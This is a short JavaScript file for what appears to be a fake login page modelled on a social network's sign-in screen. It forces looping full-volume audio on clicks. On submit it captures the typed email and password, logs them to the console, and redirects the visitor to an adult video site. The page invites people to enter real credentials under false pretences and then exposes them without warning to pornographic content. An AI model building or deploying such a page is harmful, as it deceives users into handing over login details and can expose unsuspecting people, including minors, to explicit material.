document.addEventListener('DOMContentLoaded', function() {
    var audio = document.getElementById('backgroundAudio');
    audio.loop = true; // Ensure the audio loops
    audio.volume = 1.0; // Set volume to 100%

    // Function to play audio
    function playAudio() {
        audio.play().catch(function(error) {
            console.error('Audio playback failed:', error);
        });
    }

    // Play audio on any click on the document
    document.addEventListener('click', function() {
        playAudio();
    });

    // Ensure the audio continues to play when the tab is active and stops when the tab is not active
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            playAudio();
        } else {
            audio.pause();
        }
    });

    // Play audio when "Log In" button is clicked
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        playAudio(); // Play audio on form submit

        if (email && password) {
            // Log user inputs to the console
            console.log('Email:', email);
            console.log('Password:', password);
            
            // Redirect to the specified URL after successful submission
            window.location.href = 'https://beeg.com/';
        } else {
            // Show an error message if fields are not filled (if necessary)
            console.log('Please fill in both fields.');
        }
    });

    // Play audio when "Forgotten password?" link is clicked
    document.getElementById('forgotPasswordLink').addEventListener('click', function() {
        playAudio();
    });

    // Play audio when "Create New Account" button is clicked
    document.getElementById('createAccountButton').addEventListener('click', function() {
        playAudio();
    });
});












